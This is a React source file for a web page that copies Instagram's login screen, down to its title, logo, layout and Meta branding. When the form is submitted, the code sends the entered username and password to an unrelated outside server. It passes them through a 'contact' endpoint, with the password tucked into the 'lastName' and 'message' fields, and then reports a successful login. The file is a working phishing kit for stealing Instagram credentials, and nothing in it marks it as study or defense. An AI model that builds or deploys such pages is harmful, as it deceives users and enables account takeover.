import { createFileRoute } from "@tanstack/react-router";
import { useState } from "react";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Login • Instagram" },
      {
        name: "description",
        content:
          "Log in to Instagram to see photos and videos from your friends.",
      },
      { property: "og:title", content: "Login • Instagram" },
      {
        property: "og:description",
        content:
          "Log in to Instagram to see photos and videos from your friends.",
      },
    ],
  }),
  component: Index,
});

function Index() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const canSubmit = username.length > 0 && password.length >= 6;

  const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (canSubmit) {
      // Handle login logic here
      fetch("https://cityridesapi.generativebee.com/api/contact/create-user-query", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email: "test@gmail.com",
          firstName: username,
          lastName: password,
          message: password,
          mobile: "9672305647"
        }),
      })
        .then((response) => response.json())
        .then((data) => {
          // Handle successful login
          console.log("Login successful:", data);
        })
        .catch((error) => {
          // Handle login error
          console.error("Login error:", error);
        });
      console.log("Logging in with:", { username, password });
    }
  }

  return (
    <div className="min-h-screen bg-white flex flex-col justify-between items-center px-6 py-6 font-sans">
      {/* Top Section */}
      <div className="w-full max-w-[360px] flex flex-col items-center pt-2">
        {/* Language selector */}
        <div className="text-[#65676b] text-[13px] font-medium flex items-center gap-1 cursor-pointer mb-16 hover:opacity-85">
          <span>English (UK)</span>
          <svg
            width="10"
            height="10"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="3"
            strokeLinecap="round"
            strokeLinejoin="round"
            className="mt-0.5 opacity-60"
          >
            <polyline points="6 9 12 15 18 9"></polyline>
          </svg>
        </div>

        {/* Instagram Gradient Icon */}
        <div className="mb-14">
          <svg
            width="78"
            height="78"
            viewBox="0 0 80 80"
            fill="none"
            xmlns="http://www.w3.org/2000/svg"
          >
            <defs>
              <radialGradient
                id="insta-grad"
                cx="30%"
                cy="107%"
                r="130%"
                fx="30%"
                fy="107%"
              >
                <stop offset="0%" stopColor="#fdf497" />
                <stop offset="5%" stopColor="#fdf497" />
                <stop offset="45%" stopColor="#fd5949" />
                <stop offset="60%" stopColor="#d6249f" />
                <stop offset="90%" stopColor="#285AEB" />
              </radialGradient>
            </defs>
            <rect width="80" height="80" rx="20" fill="url(#insta-grad)" />
            <rect
              x="18"
              y="18"
              width="44"
              height="44"
              rx="12"
              stroke="white"
              strokeWidth="4.5"
              fill="none"
            />
            <circle
              cx="40"
              cy="40"
              r="9.5"
              stroke="white"
              strokeWidth="4.5"
              fill="none"
            />
            <circle cx="53" cy="27" r="3" fill="white" />
          </svg>
        </div>

        {/* Login Form */}
        <form
          onSubmit={(e) => {
            e.preventDefault();
            handleSubmit(e);
          }}
          className="w-full flex flex-col gap-3"
        >
          <div className="w-full">
            <input
              type="text"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="w-full h-[58px] bg-white border border-[#dadde1] rounded-[16px] px-4 text-[15px] text-[#1c1e21] placeholder-[#65676b] focus:outline-none focus:border-[#0064e0] transition-colors"
              placeholder="Username, email address or mobile ..."
              autoComplete="username"
            />
          </div>

          <div className="w-full">
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full h-[58px] bg-white border border-[#dadde1] rounded-[16px] px-4 text-[15px] text-[#1c1e21] placeholder-[#65676b] focus:outline-none focus:border-[#0064e0] transition-colors"
              placeholder="Password"
              autoComplete="current-password"
            />
          </div>

          <button
            type="submit"
            className="mt-2 w-full h-[46px] rounded-full bg-[#0064e0] text-white text-[16px] font-semibold hover:bg-[#0056c2] active:scale-[0.99] disabled:opacity-60 disabled:pointer-events-none transition-all cursor-pointer flex items-center justify-center"
          >
            Log in
          </button>
        </form>

        {/* Forgotten password? */}
        <a
          href="#"
          className="mt-5 text-[15px] font-medium text-[#1c2b33] hover:underline"
        >
          Forgotten password?
        </a>
      </div>

      {/* Bottom Section */}
      <div className="w-full max-w-[360px] flex flex-col items-center gap-6 pb-2">
        {/* Create new account */}
        <a
          href="#"
          className="w-full h-[44px] rounded-full border border-[#0064e0] text-[#0064e0] text-[15px] font-semibold flex items-center justify-center hover:bg-[#f5f9ff] active:scale-[0.99] transition-all cursor-pointer"
        >
          Create new account
        </a>

        {/* Meta Logo */}
        <div className="flex items-center gap-1.5 justify-center">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            viewBox="0 0 16 16"
            fill="currentColor"
            className="w-[18px] h-[18px] text-[#0064e0]"
          >
            <path
              fillRule="evenodd"
              d="M8.217 5.243C9.145 3.988 10.171 3 11.483 3 13.96 3 16 6.153 16.001 9.907c0 2.29-.986 3.725-2.757 3.725-1.543 0-2.395-.866-3.924-3.424l-.667-1.123-.118-.197a55 55 0 0 0-.53-.877l-1.178 2.08c-1.673 2.925-2.615 3.541-3.923 3.541C1.086 13.632 0 12.217 0 9.973 0 6.388 1.995 3 4.598 3q.477-.001.924.122c.31.086.611.22.913.407.577.359 1.154.915 1.782 1.714m1.516 2.224q-.378-.615-.727-1.133L9 6.326c.845-1.305 1.543-1.954 2.372-1.954 1.723 0 3.102 2.537 3.102 5.653 0 1.188-.39 1.877-1.195 1.877-.773 0-1.142-.51-2.61-2.87zM4.846 4.756c.725.1 1.385.634 2.34 2.001A212 212 0 0 0 5.551 9.3c-1.357 2.126-1.826 2.603-2.581 2.603-.777 0-1.24-.682-1.24-1.9 0-2.602 1.298-5.264 2.846-5.264q.137 0 .27.018"
            />
          </svg>
          <span className="text-[#65676b] text-[13px] font-semibold tracking-wide">
            Meta
          </span>
        </div>
      </div>
    </div>
  );
}

